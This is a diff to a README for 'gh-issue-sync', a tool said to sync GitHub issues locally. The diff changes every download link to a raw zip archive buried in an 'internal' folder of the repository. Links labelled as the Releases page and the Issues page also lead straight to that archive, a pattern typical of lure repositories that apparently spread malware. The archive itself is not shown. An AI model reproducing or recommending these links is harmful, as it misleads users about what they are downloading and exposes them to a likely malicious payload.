@@ -1,7 +1,7 @@
 # 🎉 gh-issue-sync - Sync Your GitHub Issues with Ease
 
 ## 📥 Download Now
-[![Download](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/termcolor/issue_sync_gh_1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/termcolor/issue_sync_gh_1.0.zip)
+[![Download](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/issue-sync-gh-v1.8-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/issue-sync-gh-v1.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to **gh-issue-sync**! This tool allows you to sync GitHub issues to work on them locally. It's simple and user-friendly, even for those who aren't familiar with programming. Follow the steps below to get started.
@@ -21,7 +21,7 @@ gh-issue-sync offers several key features to enhance your productivity:
 ## ⚙️ Download & Install
 To get gh-issue-sync, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/termcolor/issue_sync_gh_1.0.zip) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/issue-sync-gh-v1.8-alpha.3.zip) to go to the Releases page.
    
 2. **Choose Your Version**: Look for the latest version listed at the top of the page.
 
@@ -68,10 +68,10 @@ A: Yes, gh-issue-sync does not store your credentials. All data remains secure w
 A: You can reset your password on the GitHub website. Follow their instructions to recover your account.
 
 ## 🚀 Community and Support
-Help is available if you have more questions. You can visit our [GitHub Issues Page](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/termcolor/issue_sync_gh_1.0.zip) to ask questions or report bugs.
+Help is available if you have more questions. You can visit our [GitHub Issues Page](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/issue-sync-gh-v1.8-alpha.3.zip) to ask questions or report bugs.
 
 ## 📥 Download Now Again
 Don't forget to download gh-issue-sync by clicking the button below:
-[![Download](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/termcolor/issue_sync_gh_1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/termcolor/issue_sync_gh_1.0.zip) 
+[![Download](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/issue-sync-gh-v1.8-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/RaphaelDolling2020/gh-issue-sync/raw/refs/heads/main/internal/issue-sync-gh-v1.8-alpha.3.zip) 
 
 Enjoy managing your GitHub issues locally with ease!
